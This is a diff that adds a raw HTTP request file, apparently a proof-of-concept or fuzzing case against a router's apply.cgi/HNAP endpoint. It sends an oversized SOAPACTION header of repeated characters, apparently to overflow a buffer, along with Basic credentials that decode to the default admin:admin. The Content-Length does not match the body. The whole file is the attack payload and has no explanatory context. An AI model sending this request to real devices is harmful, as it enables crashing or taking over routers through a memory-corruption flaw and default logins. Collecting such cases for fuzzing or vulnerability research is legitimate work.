@@ -1,0 +1,8 @@
+POST /apply.cgi HTTP/1.1
+Host: 10.0.0.90
+SOAPACTION:HNAP1zywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzyw
+Authorization: Basic YWRtaW46YWRtaW4=
+Content-Length: 13
+
+123123123
+
